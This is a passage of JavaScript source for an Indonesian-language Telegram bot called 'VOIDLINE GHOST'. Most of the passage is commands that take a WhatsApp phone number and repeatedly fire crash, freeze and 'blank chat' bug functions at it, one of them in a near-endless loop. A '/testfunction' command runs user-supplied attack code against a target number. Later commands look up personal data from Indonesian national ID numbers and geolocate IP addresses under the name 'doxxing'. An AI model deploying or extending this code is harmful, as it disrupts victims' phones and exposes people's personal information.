  await ctx.telegram.editMessageCaption(
    ctx.chat.id,
    processMessageId,
    undefined,
    `<pre>╭═―⊱ ⎧ VOIDLINE GHOST ⎭ ⊰―═⬡
│⌑ Target: ${q}
│⌑ Type: Blank Chat Android 
│⌑ Status: 𝘚𝘶𝘤𝘤𝘦𝘴𝘴𝘧𝘶𝘭𝘭𝘺
│⌑ Progress: ${progressBar(100)}
╰─────────────────────═⬡</pre>`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "⌜📱⌟ チェック対象", url: `https://wa.me/${q}` }
        ]]
      }
    }
  );
});

bot.command("xdocu", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {

  if (!checkGroupOnly(ctx)) return;

  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /xdocu 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl2, {
    caption: `<pre>╭═―⊱ ⎧ VOIDLINE GHOST ⎭ ⊰―═⬡
│⌑ Target: ${q}
│⌑ Type: Delay For Murbug 
│⌑ Status: 𝘗𝘳𝘰𝘴𝘦𝘴 𝘗𝘦𝘯𝘨𝘪𝘳𝘪𝘮𝘢𝘯 𝘉𝘶𝘨...
│⌑ Progress: ${progressBar(0)}
╰─────────────────────═⬡</pre>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ チェック対象", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let p = 10; p <= 100; p += 10) {
    await sleep(600);
    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      processMessageId,
      undefined,
      `<pre>╭═―⊱ ⎧ VOIDLINE GHOST ⎭ ⊰―═⬡
│⌑ Target: ${q}
│⌑ Type: Delay For Murbug
│⌑ Status: 𝘗𝘳𝘰𝘴𝘦𝘴 𝘗𝘦𝘯𝘨𝘪𝘳𝘪𝘮𝘢𝘯 𝘉𝘶𝘨...
│⌑ Progress: ${progressBar(p)}
╰─────────────────────═⬡</pre>`,
      { parse_mode: "HTML" }
    );
  }

  for (let i = 0; i < 1000000000000000; i++) {
    await LocaInvis(sock, target);
  }

  await ctx.telegram.editMessageCaption(
    ctx.chat.id,
    processMessageId,
    undefined,
    `<pre>╭═―⊱ ⎧ VOIDLINE GHOST ⎭ ⊰―═⬡
│⌑ Target: ${q}
│⌑ Type: Delay For Murbug
│⌑ Status: 𝘚𝘶𝘤𝘤𝘦𝘴𝘴𝘧𝘶𝘭𝘭𝘺
│⌑ Progress: ${progressBar(100)}
╰─────────────────────═⬡</pre>`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "⌜📱⌟ チェック対象", url: `https://wa.me/${q}` }
        ]]
      }
    }
  );
});

bot.command("xplor", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {

  if (!checkGroupOnly(ctx)) return;

  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /xplor 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl2, {
    caption: `<pre>╭═―⊱ ⎧ VOIDLINE GHOST ⎭ ⊰―═⬡
│⌑ Target: ${q}
│⌑ Type: Blank Chat Ios
│⌑ Status: 𝘗𝘳𝘰𝘴𝘦𝘴 𝘗𝘦𝘯𝘨𝘪𝘳𝘪𝘮𝘢𝘯 𝘉𝘶𝘨...
│⌑ Progress: ${progressBar(0)}
╰─────────────────────═⬡</pre>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ チェック対象", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let p = 10; p <= 100; p += 10) {
    await sleep(600);
    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      processMessageId,
      undefined,
      `<pre>╭═―⊱ ⎧ VOIDLINE GHOST ⎭ ⊰―═⬡
│⌑ Target: ${q}
│⌑ Type: Blank Chat Ios
│⌑ Status: 𝘗𝘳𝘰𝘴𝘦𝘴 𝘗𝘦𝘯𝘨𝘪𝘳𝘪𝘮𝘢𝘯 𝘉𝘶𝘨...
│⌑ Progress: ${progressBar(p)}
╰─────────────────────═⬡</pre>`,
      { parse_mode: "HTML" }
    );
  }

  for (let i = 0; i < 10; i++) {
    await JayaBlank(target);
  }

  await ctx.telegram.editMessageCaption(
    ctx.chat.id,
    processMessageId,
    undefined,
    `<pre>╭═―⊱ ⎧ VOIDLINE GHOST ⎭ ⊰―═⬡
│⌑ Target: ${q}
│⌑ Type: Blank Chat Ios
│⌑ Status: 𝘚𝘶𝘤𝘤𝘦𝘴𝘴𝘧𝘶𝘭𝘭𝘺
│⌑ Progress: ${progressBar(100)}
╰─────────────────────═⬡</pre>`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "⌜📱⌟ チェック対象", url: `https://wa.me/${q}` }
        ]]
      }
    }
  );
});

bot.command("xpler", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {

  if (!checkGroupOnly(ctx)) return;

  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /xpler 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl2, {
    caption: `<pre>╭═―⊱ ⎧ VOIDLINE GHOST ⎭ ⊰―═⬡
│⌑ Target: ${q}
│⌑ Type: Forclose Bebas Spam
│⌑ Status: 𝘗𝘳𝘰𝘴𝘦𝘴 𝘗𝘦𝘯𝘨𝘪𝘳𝘪𝘮𝘢𝘯 𝘉𝘶𝘨...
│⌑ Progress: ${progressBar(0)}
╰─────────────────────═⬡</pre>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ チェック対象", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let p = 10; p <= 100; p += 10) {
    await sleep(600);
    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      processMessageId,
      undefined,
      `<pre>╭═―⊱ ⎧ VOIDLINE GHOST ⎭ ⊰―═⬡
│⌑ Target: ${q}
│⌑ Type: Forclose Bebas Spam
│⌑ Status: 𝘗𝘳𝘰𝘴𝘦𝘴 𝘗𝘦𝘯𝘨𝘪𝘳𝘪𝘮𝘢𝘯 𝘉𝘶𝘨...
│⌑ Progress: ${progressBar(p)}
╰─────────────────────═⬡</pre>`,
      { parse_mode: "HTML" }
    );
  }

  for (let i = 0; i < 50; i++) {
    await fcv1(target);
  }

  await ctx.telegram.editMessageCaption(
    ctx.chat.id,
    processMessageId,
    undefined,
    `<pre>╭═―⊱ ⎧ VOIDLINE GHOST ⎭ ⊰―═⬡
│⌑ Target: ${q}
│⌑ Type: Forclose Bebas Spam
│⌑ Status: 𝘚𝘶𝘤𝘤𝘦𝘴𝘴𝘧𝘶𝘭𝘭𝘺
│⌑ Progress: ${progressBar(100)}
╰─────────────────────═⬡</pre>`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "⌜📱⌟ チェック対象", url: `https://wa.me/${q}` }
        ]]
      }
    }
  );
});

bot.command("forclose", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {

  if (!checkGroupOnly(ctx)) return;

  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /forclose 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl2, {
    caption: `<pre>╭═―⊱ ⎧ VOIDLINE GHOST ⎭ ⊰―═⬡
│⌑ Target: ${q}
│⌑ Type: Forclose For Murbug
│⌑ Status: 𝘗𝘳𝘰𝘴𝘦𝘴 𝘗𝘦𝘯𝘨𝘪𝘳𝘪𝘮𝘢𝘯 𝘉𝘶𝘨...
│⌑ Progress: ${progressBar(0)}
╰─────────────────────═⬡</pre>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ チェック対象", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let p = 10; p <= 100; p += 10) {
    await sleep(600);
    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      processMessageId,
      undefined,
      `<pre>╭═―⊱ ⎧ VOIDLINE GHOST ⎭ ⊰―═⬡
│⌑ Target: ${q}
│⌑ Type: Forclose For Murbug
│⌑ Status: 𝘗𝘳𝘰𝘴𝘦𝘴 𝘗𝘦𝘯𝘨𝘪𝘳𝘪𝘮𝘢𝘯 𝘉𝘶𝘨...
│⌑ Progress: ${progressBar(p)}
╰─────────────────────═⬡</pre>`,
      { parse_mode: "HTML" }
    );
  }

  for (let i = 0; i < 50; i++) {
    await fcv1(target);
  }

  await ctx.telegram.editMessageCaption(
    ctx.chat.id,
    processMessageId,
    undefined,
    `<pre>╭═―⊱ ⎧ VOIDLINE GHOST ⎭ ⊰―═⬡
│⌑ Target: ${q}
│⌑ Type: Forclose For Murbug
│⌑ Status: 𝘚𝘶𝘤𝘤𝘦𝘴𝘴𝘧𝘶𝘭𝘭𝘺
│⌑ Progress: ${progressBar(100)}
╰─────────────────────═⬡</pre>`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "⌜📱⌟ チェック対象", url: `https://wa.me/${q}` }
        ]]
      }
    }
  );
});

bot.command("xcrash", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {

  if (!checkGroupOnly(ctx)) return;

  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /xcrash 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl2, {
    caption: `<pre>╭═―⊱ ⎧ VOIDLINE GHOST ⎭ ⊰―═⬡
│⌑ Target: ${q}
│⌑ Type: Crash Invisible Android
│⌑ Status: 𝘗𝘳𝘰𝘴𝘦𝘴 𝘗𝘦𝘯𝘨𝘪𝘳𝘪𝘮𝘢𝘯 𝘉𝘶𝘨...
│⌑ Progress: ${progressBar(0)}
╰─────────────────────═⬡</pre>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ チェック対象", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let p = 10; p <= 100; p += 10) {
    await sleep(600);
    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      processMessageId,
      undefined,
      `<pre>╭═―⊱ ⎧ VOIDLINE GHOST ⎭ ⊰―═⬡
│⌑ Target: ${q}
│⌑ Type: Crash Invisible Android
│⌑ Status: 𝘗𝘳𝘰𝘴𝘦𝘴 𝘗𝘦𝘯𝘨𝘪𝘳𝘪𝘮𝘢𝘯 𝘉𝘶𝘨...
│⌑ Progress: ${progressBar(p)}
╰─────────────────────═⬡</pre>`,
      { parse_mode: "HTML" }
    );
  }

  for (let i = 0; i < 65; i++) {
    await Fcv2(target);
  }

  await ctx.telegram.editMessageCaption(
    ctx.chat.id,
    processMessageId,
    undefined,
    `<pre>╭═―⊱ ⎧ VOIDLINE GHOST ⎭ ⊰―═⬡
│⌑ Target: ${q}
│⌑ Type: Crash Invisible Android
│⌑ Status: 𝘚𝘶𝘤𝘤𝘦𝘴𝘴𝘧𝘶𝘭𝘭𝘺
│⌑ Progress: ${progressBar(100)}
╰─────────────────────═⬡</pre>`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "⌜📱⌟ チェック対象", url: `https://wa.me/${q}` }
        ]]
      }
    }
  );
});

bot.command("ioskill", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {

  if (!checkGroupOnly(ctx)) return;

  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /ioskill 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl2, {
    caption: `<pre>╭═―⊱ ⎧ VOIDLINE GHOST ⎭ ⊰―═⬡
│⌑ Target: ${q}
│⌑ Type: Crash Invisible iPhone
│⌑ Status: 𝘗𝘳𝘰𝘴𝘦𝘴 𝘗𝘦𝘯𝘨𝘪𝘳𝘪𝘮𝘢𝘯 𝘉𝘶𝘨...
│⌑ Progress: ${progressBar(0)}
╰─────────────────────═⬡</pre>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ チェック対象", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let p = 10; p <= 100; p += 10) {
    await sleep(600);
    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      processMessageId,
      undefined,
      `<pre>╭═―⊱ ⎧ VOIDLINE GHOST ⎭ ⊰―═⬡
│⌑ Target: ${q}
│⌑ Type: Crash Invisible iPhone
│⌑ Status: 𝘗𝘳𝘰𝘴𝘦𝘴 𝘗𝘦𝘯𝘨𝘪𝘳𝘪𝘮𝘢𝘯 𝘉𝘶𝘨...
│⌑ Progress: ${progressBar(p)}
╰─────────────────────═⬡</pre>`,
      { parse_mode: "HTML" }
    );
  }

  for (let i = 0; i < 100; i++) {
    await Fcv2(target);
  }

  await ctx.telegram.editMessageCaption(
    ctx.chat.id,
    processMessageId,
    undefined,
    `<pre>╭═―⊱ ⎧ VOIDLINE GHOST ⎭ ⊰―═⬡
│⌑ Target: ${q}
│⌑ Type: Crash Invisible iPhone
│⌑ Status: 𝘚𝘶𝘤𝘤𝘦𝘴𝘴𝘧𝘶𝘭𝘭𝘺
│⌑ Progress: ${progressBar(100)}
╰─────────────────────═⬡</pre>`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "⌜📱⌟ チェック対象", url: `https://wa.me/${q}` }
        ]]
      }
    }
  );
});

bot.command("forcex", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {

  if (!checkGroupOnly(ctx)) return;

  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /forcex 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl2, {
    caption: `<pre>╭═―⊱ ⎧ VOIDLINE GHOST ⎭ ⊰―═⬡
│⌑ Target: ${q}
│⌑ Type: Forclose X Delay
│⌑ Status: 𝘗𝘳𝘰𝘴𝘦𝘴 𝘗𝘦𝘯𝘨𝘪𝘳𝘪𝘮𝘢𝘯 𝘉𝘶𝘨...
│⌑ Progress: ${progressBar(0)}
╰─────────────────────═⬡</pre>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ チェック対象", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let p = 10; p <= 100; p += 10) {
    await sleep(600);
    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      processMessageId,
      undefined,
      `<pre>╭═―⊱ ⎧ VOIDLINE GHOST ⎭ ⊰―═⬡
│⌑ Target: ${q}
│⌑ Type: Forclose X Delay
│⌑ Status: 𝘗𝘳𝘰𝘴𝘦𝘴 𝘗𝘦𝘯𝘨𝘪𝘳𝘪𝘮𝘢𝘯 𝘉𝘶𝘨...
│⌑ Progress: ${progressBar(p)}
╰─────────────────────═⬡</pre>`,
      { parse_mode: "HTML" }
    );
  }

  for (let i = 0; i < 50; i++) {
    await fcv1(target);
  }

  await ctx.telegram.editMessageCaption(
    ctx.chat.id,
    processMessageId,
    undefined,
    `<pre>╭═―⊱ ⎧ VOIDLINE GHOST ⎭ ⊰―═⬡
│⌑ Target: ${q}
│⌑ Type: Forclose X Delay
│⌑ Status: 𝘚𝘶𝘤𝘤𝘦𝘴𝘴𝘧𝘶𝘭𝘭𝘺
│⌑ Progress: ${progressBar(100)}
╰─────────────────────═⬡</pre>`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "⌜📱⌟ チェック対象", url: `https://wa.me/${q}` }
        ]]
      }
    }
  );
});

bot.command(
  'testfunction',
  checkWhatsAppConnection,
  checkPremium,
  checkCooldown,
  async (ctx) => {
    const chatId = ctx.chat.id;
    const userId = ctx.from.id;
    const args = ctx.message.text.trim().split(" ");

    if (args.length < 3)
      return ctx.reply(
        "🪧 ☇ Format: /testfunction 62××× 10 (reply function)"
      );

    const q = args[1];
    const jumlah = Math.max(0, Math.min(parseInt(args[2]) || 1, 1000));
    if (isNaN(jumlah) || jumlah <= 0)
      return ctx.reply("❌ ☇ Jumlah harus angka");

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.text)
      return ctx.reply("❌ ☇ Reply dengan function JavaScript");

    const thumbnailUrl = "https://files.catbox.moe/unfg2r.jpg";

    const captionStart = `
<blockquote><pre>⬡═—⊱ ⎧ VOIDLINE GHOST ⎭ ⊰—═⬡</pre></blockquote>
⌑ Target
╰❁ ${q}

⌑ Type
╰❁ Unknown Function

⌑ Status
╰❁ Process...
`;

    const processMsg = await ctx.replyWithPhoto(thumbnailUrl, {
      caption: captionStart,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}` }]
        ],
      },
    });

    const safeSock = createSafeSock(sock);
    const funcCode = ctx.message.reply_to_message.text;

    const matchFunc = funcCode.match(/async function\s+(\w+)/);
    if (!matchFunc) return ctx.reply("❌ ☇ Function tidak valid");

    const funcName = matchFunc[1];
    const wrapper = `${funcCode}\n${funcName}`;

    const sandbox = {
      console,
      Buffer,
      sock: safeSock,
      target,
      sleep,
      generateWAMessageFromContent,
      generateWAMessage,
      prepareWAMessageMedia,
      proto,
      jidDecode,
      areJidsSameUser,
    };

    const context = vm.createContext(sandbox);
    const fn = vm.runInContext(wrapper, context);

    for (let i = 0; i < jumlah; i++) {
      try {
        const arity = fn.length;
        if (arity === 1) await fn(target);
        else if (arity === 2) await fn(safeSock, target);
        else await fn(safeSock, target, true);
      } catch (err) {}
      await sleep(200);
    }

    const captionFinal = `
<blockquote><pre>⬡═—⊱ ⎧ VOIDLINE GHOST ⎭ ⊰—═⬡</pre></blockquote>
⌑ Target
╰❁ ${q}

⌑ Type
╰❁ Unknown Function

⌑ Status
╰❁ ✅ Success
`;

    try {
      await ctx.editMessageCaption(captionFinal, {
        chat_id: chatId,
        message_id: processMsg.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}` }]
          ],
        },
      });
    } catch (e) {
      await ctx.replyWithPhoto(thumbnailUrl, {
        caption: captionFinal,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}` }]
          ],
        },
      });
    }
  }
);

///=======( TOOLS AREA )=======\\\

bot.command("tiktokdl", async (ctx) => { 
const args = ctx.message.text.split(/\s+/).slice(1).join(' '); if (!args) return ctx.reply('🪧 ☇ Format: /tiktokdl https://example.com/');

let url = args; if (ctx.message.entities) { for (const e of ctx.message.entities) { if (e.type === 'url') { url = ctx.message.text.substring(e.offset, e.offset + e.length); break; } } }

const wait = await ctx.reply('⌛ ☇ Tunggu sebentar...');

try { const { data } = await axios.get('https://tikwm.com/api/', { params: { url }, headers: { 'user-agent': 'Mozilla/5.0', accept: 'application/json' }, timeout: 20000 });

if (!data || data.code !== 0 || !data.data) return ctx.reply('❌ ☇ Gagal ambil data video');

const d = data.data;

if (Array.isArray(d.images) && d.images.length) {
  const imgs = d.images.slice(0, 10);
  for (const img of imgs) {
    const res = await axios.get(img, { responseType: 'arraybuffer' });
    await ctx.replyWithPhoto({ source: Buffer.from(res.data) });
  }
  return;
}

const videoUrl = d.play || d.hdplay || d.wmplay;
if (!videoUrl) return ctx.reply('❌ ☇ Tidak ada link video');

const video = await axios.get(videoUrl, { responseType: 'arraybuffer' });
await ctx.replyWithVideo({ source: Buffer.from(video.data) });

} catch { await ctx.reply('❌ ☇ Error mengunduh video'); }

try { await ctx.deleteMessage(wait.message_id); } catch {} });

bot.command('doxxingip', async (ctx) => {
  const chatId = ctx.chat.id;
  const userId = ctx.from.id;
  const ip = ctx.message.text.split(' ')[1]?.trim();

  if (!ip) {
    return ctx.reply("❌ ☇ Format: /doxxingip <IP>");
  }

  const userPremium = premiumUsers.find(u => u.id === userId);
  if (!userPremium || new Date(userPremium.expiresAt) < new Date()) {
    return ctx.reply("❌ ☇ Kamu bukan user Premium!");
  }

  function isValidIPv4(ip) {
    const parts = ip.split(".");
    if (parts.length !== 4) return false;
    return parts.every(
      p => /^\d{1,3}$/.test(p) && !(p.length > 1 && p.startsWith("0")) && +p >= 0 && +p <= 255
    );
  }

  function isValidIPv6(ip) {
    const r = /^(([0-9A-Fa-f]{1,4}:){7}[0-9A-Fa-f]{1,4}|(([0-9A-Fa-f]{1,4}:){1,7}:)|(::([0-9A-Fa-f]{1,4}:){0,6}[0-9A-Fa-f]{1,4}))$/;
    return r.test(ip);
  }

  if (!isValidIPv4(ip) && !isValidIPv6(ip)) {
    return ctx.reply(
      "❌ ☇ IP tidak valid. Masukkan IPv4 (contoh: 8.8.8.8) atau IPv6 yang benar."
    );
  }

  const processingMsg = await ctx.reply(
    `🔎 ☇ Tracking IP ${ip} sedang diproses...`
  );

  try {
    const res = await axios.get(`https://ipwhois.app/json/${encodeURIComponent(ip)}`, {
      timeout: 10000
    });
    const data = res.data;

    if (!data || data.success === false) {
      return ctx.reply(`❌ ☇ Gagal mendapatkan data untuk IP: ${ip}`);
    }

    const lat = data.latitude || "-";
    const lon = data.longitude || "-";
    const mapsUrl =
      lat !== "-" && lon !== "-"
        ? `https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(lat + "," + lon)}`
        : null;

    const caption = `
<blockquote><pre>⬡⊱ ⎧ VOIDLINE GHOST ⎭ ⊰⬡</pre></blockquote>
⌑ IP
╰❁ ${data.ip || "-"}

⌑ Country
╰❁ ${data.country || "-"} ${data.country_code ? `(${data.country_code})` : ""}

⌑ Region
╰❁ ${data.region || "-"}

⌑ City
╰❁ ${data.city || "-"}

⌑ ZIP
╰❁ ${data.postal || "-"}

⌑ Timezone
╰❁ ${data.timezone_gmt || "-"}

⌑ ISP
╰❁ ${data.isp || "-"}

⌑ Org
╰❁ ${data.org || "-"}

⌑ ASN
╰❁ ${data.asn || "-"}

⌑ Lat/Lon
╰❁ ${lat}, ${lon}
${mapsUrl ? `📍 ☇ <a href="${mapsUrl}">Buka di Maps</a>` : ""}
`;

    await ctx.reply(caption, {
      parse_mode: "HTML",
      disable_web_page_preview: false
    });
  } catch (err) {
    await ctx.reply(
      "❌ ☇ Terjadi kesalahan saat mengambil data IP (timeout atau API tidak merespon). Coba lagi nanti."
    );
  } finally {
    try {
      await ctx.deleteMessage(processingMsg.message_id);
    } catch {}
  }
});

bot.command("anime", async (ctx) => {
  const chatId = ctx.chat.id;
  const text = ctx.message.text || "";
  const query = text.replace(/^\/anime\s*/i, "").trim();

  if (!query) {
    return ctx.reply(
      "☇ Gunakan perintah : `/anime <judul anime>`",
      { parse_mode: "Markdown" }
    );
  }

  try {
    const apiUrl =
      `https://api.jikan.moe/v4/anime?q=${encodeURIComponent(query)}&limit=1`;

    const res = await fetch(apiUrl);
    const json = await res.json();

    if (!json || !Array.isArray(json.data) || json.data.length === 0) {
      return ctx.reply("❌ Tidak Menemukan Daftar Anime dengan judul tersebut.");
    }

    const anime = json.data[0];

    const title = anime.title || "-";
    const type = anime.type || "-";
    const episodes = anime.episodes ?? "?";
    const status = anime.status || "-";
    const score = anime.score ?? "N/A";
    const malUrl = anime.url || "-";
    const imageUrl = anime.images?.jpg?.image_url;
    const synopsis = anime.synopsis
      ? anime.synopsis.slice(0, 400) + (anime.synopsis.length > 400 ? "..." : "")
      : "Tidak ada sinopsis.";

    const caption = `\`\`\`
⧂ BERIKUT DATA ANIME
\`\`\`
☇ Title : ${title}
☇ Type : ${type}
☇ Episode : ${episodes}
☇ Skor : ${score}
☇ Status : ${status}
☇ Sinopsis : ${synopsis}
☇ Link : [MyAnimeList](${malUrl})
`;

    if (imageUrl) {
      await ctx.replyWithPhoto(imageUrl, {
        caption,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "☇ Cari Lagi", switch_inline_query_current_chat: "/anime " }]
          ]
        }
      });
    } else {
      await ctx.reply(caption, { parse_mode: "Markdown" });
    }

  } catch (err) {
    console.error("Anime Error:", err);
    ctx.reply("⚠️ Yah Tidak Ada Data, Dengan Anime Yang Kamu Cari");
  }
});

bot.command('nikparse', async (ctx) => {
  const chatId = ctx.chat.id;
  const userId = ctx.from.id;
  const args = ctx.message.text.split(' ').slice(1);
  const nik = args[0]?.trim();

  if (!nik) return ctx.reply("🪧 ☇ Format: /nikparse 1234567890123456");
  if (!/^\d{16}$/.test(nik)) return ctx.reply("❌ ☇ NIK harus 16 digit angka");

  const waitMsg = await ctx.reply("⏳ ☇ Sedang memproses pengecekan NIK...");

  const replyHTML = (d) => {
    const get = (x) => (x ?? "-");

    const caption = `
<blockquote><pre>⬡⊱ ⎧ VOIDLINE GHOST ⎭ ⊰⬡</pre></blockquote>

⌑ NIK
╰❁ ${get(d.nik) || nik}

⌑ Nama
╰❁ ${get(d.nama)}

⌑ Jenis Kelamin
╰❁ ${get(d.jenis_kelamin || d.gender)}

⌑ Tempat Lahir
╰❁ ${get(d.tempat_lahir || d.tempat)}

⌑ Tanggal Lahir
╰❁ ${get(d.tanggal_lahir || d.tgl_lahir)}

⌑ Umur
╰❁ ${get(d.umur)}

⌑ Provinsi
╰❁ ${get(d.provinsi || d.province)}

⌑ Kabupaten/Kota
╰❁ ${get(d.kabupaten || d.kota || d.regency)}

⌑ Kecamatan
╰❁ ${get(d.kecamatan || d.district)}

⌑ Kelurahan/Desa
╰❁ ${get(d.kelurahan || d.village)}
`;

    return ctx.reply(caption, {
      parse_mode: "HTML",
      disable_web_page_preview: true
    });
  };

  try {
    const res = await axios.get(`https://api.nekolabs.my.id/tools/nikparser?nik=${nik}`, {
      headers: { "user-agent": "Mozilla/5.0" },
      timeout: 15000
    });

    const data =
      res.data?.data ||
      res.data?.result ||
      res.data ||
      null;

    if (data && typeof data === "object" && Object.keys(data).length > 0) {
      await replyHTML(data);
    } else {
      await ctx.reply("❌ ☇ NIK tidak ditemukan di database");
    }

  } catch (err) {
    await ctx.reply("❌ ☇ Gagal menghubungi API, coba lagi nanti");
  } finally {
    try {
      await ctx.deleteMessage(waitMsg.message_id);
    } catch {}
  }
});

bot.command('tourl', async (ctx) => {
  const chatId = ctx.chat.id;
  const userId = ctx.from.id;
  const replyMsg = ctx.message.reply_to_message;

  if (!replyMsg) {
    return ctx.reply("🪧 ☇ Format: /tourl (reply dengan foto atau video)");
  }

  let fileId = null;
  if (replyMsg.photo && replyMsg.photo.length) {
    fileId = replyMsg.photo[replyMsg.photo.length - 1].file_id;
  } else if (replyMsg.video) {
    fileId = replyMsg.video.file_id;
  } else if (replyMsg.video_note) {
    fileId = replyMsg.video_note.file_id;
  } else {
    return ctx.reply("❌ ☇ Hanya mendukung foto atau video");
  }

  const waitMsg = await ctx.reply("⏳ ☇ Mengambil file & mengunggah ke Catbox...");

  try {
    const file = await ctx.telegram.getFile(fileId);
    const fileLink = `https://api.telegram.org/file/bot${ctx.telegram.token}/${file.file_path}`;

    const uploadedUrl = await uploadToCatbox(fileLink);

    if (typeof uploadedUrl === "string" && /^https?:\/\/files\.catbox\.moe\//i.test(uploadedUrl.trim())) {
      await ctx.reply(uploadedUrl.trim());
    } else {
      await ctx.reply("❌ ☇ Gagal upload ke Catbox.\n" + String(uploadedUrl).slice(0, 200));
    }
  } catch (e) {
    const msgError = e?.response?.status
      ? `❌ ☇ Error ${e.response.status} saat unggah ke Catbox`
      : "❌ ☇ Gagal unggah, coba lagi.";
    await ctx.reply(msgError);
  } finally {
    try {
      await ctx.deleteMessage(waitMsg.message_id);
    } catch {}
  }
});

bot.command("bokep", async (ctx) => {
  const chatId = ctx.chat?.id;
  const userId = ctx.from.id;
  const msgId = ctx.message?.message_id;
  const text = ctx.message?.text;

  // validasi dasar
  if (!chatId || !text) return;

  const args = text.split(" ").slice(1).join(" ").trim();
  if (!args) {
    return ctx.reply("🪧 Gunakan: /bokep <kata kunci>", {
      reply_to_message_id: msgId,
    }).catch(() => {});
  }

  let loadingMsg;

  try {
    // ===== kirim pesan loading =====
    loadingMsg = await ctx.reply(
      `⏳ Mencari video...\n🔍 Kata kunci: ${args}`,
      { reply_to_message_id: msgId, parse_mode: "Markdown" }
    );

    const editMessage = async (newText) => {
      try {
        await ctx.telegram.editMessageText(
          chatId,
          loadingMsg.message_id,
          undefined,
          newText,
          { parse_mode: "Markdown" }
        );
      } catch (e) {
        console.log("⚠️ Gagal edit pesan:", e.message);
      }
    };

    // ===== cari video =====
    await editMessage(`🔍 *Mencari video...*\nKata kunci : ${args}`);

    const res = await fetch(
